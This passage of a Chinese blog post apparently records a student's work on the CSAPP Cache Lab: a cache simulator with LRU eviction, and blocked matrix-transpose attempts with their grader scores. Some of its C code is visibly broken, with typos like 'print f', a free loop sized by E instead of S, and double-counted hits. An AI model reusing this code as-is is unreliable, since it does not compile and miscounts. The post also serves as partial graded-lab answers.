line)</span><br><span class="hljs-comment">// &quot;Usage&quot; </span><br><span class="hljs-comment">// return 0</span><br><br><span class="hljs-comment">//if file not found</span><br><span class="hljs-comment">// &quot;traces/yi.trac: No such file or directory&quot;</span><br><span class="hljs-comment">// return 0</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// c函数中处理输入的参数</span><br><br><span class="hljs-comment">// argc 参数的多少 至少非负</span><br><br><span class="hljs-comment">// 可以是**argv *argv[] 字符串数组</span><br><span class="hljs-comment">// ./main a b c</span><br><span class="hljs-comment">// argv[0] = ./main (相当于对命令行做拆分)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br><span class="hljs-comment">// getopt(int argc, char *const argv[], const char *optstring)</span><br>    <span class="hljs-comment">// : required argument :: optional</span><br>    <span class="hljs-comment">// 默认会进行排序，使得需要的参数在前面</span><br>    <span class="hljs-type">int</span> arg, verbose = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> S, s = <span class="hljs-number">-1</span>, E = <span class="hljs-number">-1</span>, B, b = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">char</span> *path = <span class="hljs-literal">NULL</span>;<br>    FILE *fp;<br>    <span class="hljs-comment">// C 打开文件并处理输入k</span><br>    <span class="hljs-comment">// crefsim 没有做边界保护 &quot;-1&quot; 就会死循环</span><br>    <span class="hljs-comment">// getopt 并不会强制判断哪些参数一定要存在    </span><br>    <span class="hljs-keyword">while</span> ((arg = getopt(argc, argv, <span class="hljs-string">&quot;:hvs:E:b:t:&quot;</span>)) != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">switch</span> (arg) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:<br>                outputUsage();                <br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>                verbose = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>                s = atoi(optarg);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>                E = atoi(optarg);<br>                <span class="hljs-keyword">break</span>; <br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>                b = atoi(optarg);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>:<br>                <span class="hljs-comment">// printf(&quot;%d\n&quot;, optind);</span><br>                path = argv[optind - <span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;:&#x27;</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Missing required command line argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>                outputUsage();<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: invalid option -- &#x27;%c&#x27;\n&quot;</span>, argv[<span class="hljs-number">0</span>], optopt);<br>                outputUsage();<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (s &lt;= <span class="hljs-number">0</span> || E &lt;= <span class="hljs-number">0</span> || b &lt;= <span class="hljs-number">0</span> || path == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Missing required command line argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        outputUsage();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    fp = fopen(path, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!fp) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: No such file or directory\n&quot;</span>, path); <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    solve(s, E, b, fp, verbose);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="lru实现">LRU实现</h3><p>记录每组的最后遍历时间，O(n^2)，冗余的堆可以降低时间复杂度到O(nlogn)，到达的一定在最右侧，替换的在最左侧，冗余的队列也可以将时间复杂度降低到O(n)，到空间复杂度也是O(n)。</p><p>也可以利用哈希表直接定位，然后借助双端队列达到O(n)，可以保证空间严格在O(capacity)。</p><p>这里C直接使用基本的数据结构（没有哈希表）</p><p>注意用unsigned int， 参数过多...</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">checkHit</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> **data, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> **rec, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  E, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  sid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  caddr)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  i = <span class="hljs-number">0</span>; i &lt; E; i++) &#123;<br>        <span class="hljs-keyword">if</span> (data[sid][i] == caddr) &#123;<br>            rec[sid][i] = cnt;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  <span class="hljs-title function_">checkEvict</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> **rec, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> **data, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  E, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  sid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  caddr)</span> &#123;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  csign = <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  i = <span class="hljs-number">0</span>; i &lt; E; i++) &#123;<br>         <span class="hljs-keyword">if</span> (rec[sid][i] == <span class="hljs-number">0</span>) &#123;<br>             csign = <span class="hljs-number">1</span>;<br>             rec[sid][i] = cnt;<br>             data[sid][i] = caddr;<br>             <span class="hljs-keyword">break</span>;<br>         &#125;<br>     &#125; <br>     <span class="hljs-keyword">if</span> (!csign) &#123;<br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  cv = rec[sid][<span class="hljs-number">0</span>], cid = <span class="hljs-number">0</span>;<br>         <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  i = <span class="hljs-number">1</span>; i &lt; E; i++) &#123;<br>             <span class="hljs-keyword">if</span> (rec[sid][i] &lt; cv) &#123;<br>                 cv = rec[sid][i];<br>                 cid = i;<br>             &#125;<br>         &#125;<br>         data[sid][cid] = caddr;<br>         rec[sid][cid] = cnt;<br>         <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>     &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>主体的solve函数，注意代码命名的规范。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">solve</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  s, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  E, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  b, FILE *fp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  verbose)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  S = <span class="hljs-number">1</span> &lt;&lt; s;<br>    <span class="hljs-type">char</span> type;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  addr, sz; <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  hits = <span class="hljs-number">0</span>, misses = <span class="hljs-number">0</span>, evictions = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  cnt = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  **rec = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)*S);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  **data = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)*S);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  i = <span class="hljs-number">0</span>; i &lt; S; i++) &#123;<br>        rec[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> )*E);<br>        data[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> )*E);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  j = <span class="hljs-number">0</span>; j &lt; E; j++) &#123;<br>            rec[i][j] = <span class="hljs-number">0</span>;<br>            data[i][j] = <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125; <br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(fp, <span class="hljs-string">&quot; %c %x,%d&quot;</span>, &amp;type, &amp;addr, &amp;sz) != EOF) &#123;<br>        <span class="hljs-keyword">if</span> (verbose == <span class="hljs-number">1</span>) print <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-string">&quot;%c %x,%d \n&quot;</span>, type, addr, sz)</span>;<br>        <span class="hljs-keyword">if</span> (type == <span class="hljs-string">&#x27;I&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  sid = (addr &gt;&gt; b) % S, caddr = addr &gt;&gt; b;<br>        <span class="hljs-comment">// if (verbose == 1) prunsigned int f(&quot;%c %x,%d %d %d &quot;, type, addr, sz, sid, caddr);</span><br>        <span class="hljs-keyword">if</span> (type == <span class="hljs-string">&#x27;L&#x27;</span> || type == <span class="hljs-string">&#x27;S&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (checkHit(data, rec, cnt, E, sid, caddr)) &#123;<br>                hits++;<br>                <span class="hljs-keyword">if</span> (verbose == <span class="hljs-number">1</span>) print <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-string">&quot;hit &quot;</span>)</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                misses++;<br>                <span class="hljs-keyword">if</span> (verbose == <span class="hljs-number">1</span>) print <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-string">&quot;miss &quot;</span>)</span>;<br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  prev = evictions;<br>                evictions += checkEvict(rec, data, E, cnt, sid, caddr);<br>                <span class="hljs-keyword">if</span> (prev &lt; evictions) &#123;<br>                    <span class="hljs-keyword">if</span> (verbose == <span class="hljs-number">1</span>) pint <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-string">&quot;eviction&quot;</span>)</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (type == <span class="hljs-string">&#x27;M&#x27;</span>) &#123; <br>            hits++;<br>            <span class="hljs-keyword">if</span> (checkHit(data, rec, cnt, E, sid, caddr)) &#123;<br>                hits++;<br>                print <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-string">&quot;hit hit&quot;</span>)</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                misses++;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;miss &quot;</span>);<br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>  prev = evictions;<br>                evictions += checkEvict(rec, data, E, cnt, sid, caddr);<br>                <span class="hljs-keyword">if</span> (evictions &gt; prev) &#123;<br>                    <span class="hljs-keyword">if</span> (verbose == <span class="hljs-number">1</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;eviction &quot;</span>);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hit&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        cnt++;<br>    &#125;<br>    <br>    printSummary(hits, misses, evictions);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; E; i++) &#123;<br>        <span class="hljs-built_in">free</span>(rec[i]);<br>        <span class="hljs-built_in">free</span>(data[i]);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(rec);<br>    <span class="hljs-built_in">free</span>(data);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意make函数-std=c99会报错，且printSummary 不需要重复定义。</p><h2 id="part-b">Part B</h2><p>32个组，里面包含8个INT。</p><h3 id="try1">try1</h3><p>首先尝试分块，不能假定数组每一块所处的Cache，但相邻块位于不同的Cache。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> transpose_submit_desc[] = <span class="hljs-string">&quot;Transpose submission&quot;</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>    <span class="hljs-type">int</span> G = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">if</span> (M == <span class="hljs-number">64</span>) G = <span class="hljs-number">4</span>;<br>    <span class="hljs-type">int</span> tr = (M + G - <span class="hljs-number">1</span>) / G, tc = (N + G - <span class="hljs-number">1</span>) / G;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; tr; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; tc; j++) &#123;<br>            <span class="hljs-type">int</span> sl = i * G, el = min(M - <span class="hljs-number">1</span>, (i + <span class="hljs-number">1</span>) * G - <span class="hljs-number">1</span>);<br>            <span class="hljs-type">int</span> sr = j * G, er = min(N - <span class="hljs-number">1</span>, (j + <span class="hljs-number">1</span>) * G - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = sr; k &lt;= er; k++) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l = sl; l &lt;= el; l++) &#123;<br>                    B[l][k] = A[k][l];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;          <br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Cache</span> Lab summary:<br>                        <span class="hljs-attribute">Points</span>   Max pts      Misses<br><span class="hljs-attribute">Csim</span> correctness          <span class="hljs-number">27</span>.<span class="hljs-number">0</span>        <span class="hljs-number">27</span><br><span class="hljs-attribute">Trans</span> perf <span class="hljs-number">32</span>x32           <span class="hljs-number">6</span>.<span class="hljs-number">9</span>         <span class="hljs-number">8</span>         <span class="hljs-number">343</span><br><span class="hljs-attribute">Trans</span> perf <span class="hljs-number">64</span>x64           <span class="hljs-number">1</span>.<span class="hljs-number">8</span>         <span class="hljs-number">8</span>        <span class="hljs-number">1843</span><br><span class="hljs-attribute">Trans</span> perf <span class="hljs-number">61</span>x67          <span class="hljs-number">10</span>.<span class="hljs-number">0</span>        <span class="hljs-number">10</span>        <span class="hljs-number">1913</span><br>          <span class="hljs-attribute">Total</span> points    <span class="hljs-number">45</span>.<span class="hljs-number">7</span>        <span class="hljs-number">53</span><br></code></pre></td></tr></table></figure><p>可以分开考虑，分开优化。可以看到具体的hit / miss。</p><p>？理论 8 * 8 块中一定会有6次Hit，考虑B的第一行 MISS MISS HIT ...，B的第二行 MISS MISS MISS HIT ...， B的第三行 MISS HIT MISS MISS HITHIT ...至多三个MISS，第一次没有遍历过，第二次被A占用，写入后可能仍被A占用，第三次重新占用A。因此对于B最坏的情况8 * 8 中 MISS 3 * 8，而对于A而言 MISS ... 被B占用 MISS ... !!! 前提是AB的每一列属于不同的CACHE，若满足以上情况，则MISS数为 16 * 5 * 8 = 640343 倒也合理，若64 * 64也满足则会降低到 640 * 4 = 2560 (MAX)</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">64 *<span class="hljs-number"> 64 </span><br>8个INT，4 *<span class="hljs-number"> 8 </span>=<span class="hljs-number"> 32 </span>第五行与第一行位于同一个Cache<br>所以这里不能使用<span class="hljs-number"> 8 </span>*<span class="hljs-number"> 8 </span>的块，可以使用<span class="hljs-number"> 4 </span>*<span class="hljs-number"> 4 </span>的块<br>  <span class="hljs-number"> 5 </span>L 10d080,4 miss eviction<br>  <span class="hljs-number"> 6 </span>S 14d080,4 miss eviction<br>   <br>从同一个Cache开始<br>10d080<br>14d080<br></code></pre></td></tr></table></figure><h3 id="try2">try2</h3><p>！平均每一块允许MISS的次数 1.17 32 * 32，1.27 64 *64，因此被占用的次数只能是常数级别，8 * 8 的块可以 Miss 2次</p><ul><li><p>思路一：改变分块的形状或不分块？若要复用读入A中的元素，一定会导致读入B中的多块，而若要复用B中的多块，又需要读入A中的多块。</p></li><li><p>思路二：在 8 * 8 或 4 * 4 的内部块进行赋值的优化</p><p>把处于相同Cache的赋值放到最后，借助临时的变量传递。计算出当前列与当前Cache占用相同块的行号。映射出Cache号。参数较多都可以优化到小于12个，这里便于表示。</p></li><li><p>思路三：牺牲时间复杂度</p><p>一定需要读入8 * 8 的分块，意义不大。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> transpose_submit_desc[] = <span class="hljs-string">&quot;Transpose submission&quot;</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>    <span class="hljs-type">int</span> dx = <span class="hljs-number">8</span>, dy = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">if</span> (M == <span class="hljs-number">64</span>) dx = <span class="hljs-number">4</span>, dy = <span class="hljs-number">4</span>;<br>    <span class="hljs-type">int</span> tr = (M + dx - <span class="hljs-number">1</span>) / dx, tc = (N + dy - <span class="hljs-number">1</span>) / dy;<br>    <span class="hljs-keyword">if</span> (M == <span class="hljs-number">32</span> || M == <span class="hljs-number">64</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; tr; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; tc; j++) &#123;<br>                <span class="hljs-type">int</span> sl = i * dx, el = min(M - <span class="hljs-number">1</span>, (i + <span class="hljs-number">1</span>) * dx - <span class="hljs-number">1</span>);<br>                <span class="hljs-type">int</span> sr = j * dy, er = min(N - <span class="hljs-number">1</span>, (j + <span class="hljs-number">1</span>) * dy - <span class="hljs-number">1</span>);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = sr; k &lt;= er; k++) &#123;<br>                    <span class="hljs-type">int</span> cc = ((k * M + sl) / <span class="hljs-number">8</span>) % <span class="hljs-number">32</span>;<br>                    <span class="hljs-type">int</span> gsign = <span class="hljs-number">0</span>, gv = <span class="hljs-number">0</span>, gy;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l = sl; l &lt;= el; l++) &#123;<br>                        <span class="hljs-type">int</span> nc = ((l * N + k) / <span class="hljs-number">8</span>) % <span class="hljs-number">32</span>;<br>                        <span class="hljs-comment">// 若Cache相同则先不赋值</span><br>                        <span class="hljs-comment">// 确保A当前行的遍历没问题</span><br>                        <span class="hljs-comment">// A一定会占据一个B的Cache，可以等该Cache读入后顺便赋值。</span><br>                        <span class="hljs-keyword">if</span> (nc == cc) &#123;<br>                            gsign = <span class="hljs-number">1</span>;<br>                            gv = A[k][l];<br>                            gy = l;<br>                            <span class="hljs-keyword">continue</span>;<br>                        &#125;<br>                        B[l][k] = A[k][l];<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (gsign) B[gy][k] = gv;<br>                &#125;<br><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;         <br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Cache</span> Lab summary:<br>                        <span class="hljs-attribute">Points</span>   Max pts      Misses<br><span class="hljs-attribute">Csim</span> correctness          <span class="hljs-number">27</span>.<span class="hljs-number">0</span>        <span class="hljs-number">27</span><br><span class="hljs-attribute">Trans</span> perf <span class="hljs-number">32</span>x32           <span class="hljs-number">8</span>.<span class="hljs-number">0</span>         <span class="hljs-number">8</span>         <span class="hljs-number">287</span><br><span class="hljs-attribute">Trans</span> perf <span class="hljs-number">64</span>x64           <span class="hljs-number">4</span>.<span class="hljs-number">0</span>         <span class="hljs-number">8</span>        <span class="hljs-number">1651</span><br><span class="hljs-attribute">Trans</span> perf <span class="hljs-number">61</span>x67          <span class="hljs-number">10</span>.<span class="hljs-number">0</span>        <span class="hljs-number">10</span>        <span class="hljs-number">1913</span><br>          <span class="hljs-attribute">Total</span> points    <span class="hljs-number">49</span>.<span class="hljs-number">0</span>        <span class="hljs-number">53</span><br></code></pre></td></tr></table></figure><h3 id="ans">ans</h3><p>没想到可以直接复制一行/一列8个作为参数，计算Cache号数的方式也比较取巧。滥用参数的下场...循环只占了3 - 4 个参数，只取决与嵌套的深度。核心的逻辑在于：</p><ul><li>一次性 横向读入 A1 A2 A3 A4 纵向写入 B1 B2 B3 B4（同时使得转移的过程中可以横向读入，这里B1 B2 B3 B4 可能因为与A1 A2 A3A4的Cache冲突多Miss一次）</li><li>横向读入B1 暂存部分 (B1此时一定在Cache中)，一次性纵向读入 A5 A6 A7A8，读回到B1，同时读入B5，一定覆盖B1。（这里B1可能因为读入A5 A6 A7 A8多MISS一次，A5 同理）</li><li>横向读入 A5 A6 A7 A8， 纵向写入 B5 B6 B7 B8。</li><li>能够最优的前提在于 A B不占用同一个Cache的情况。</li></ul><p><a 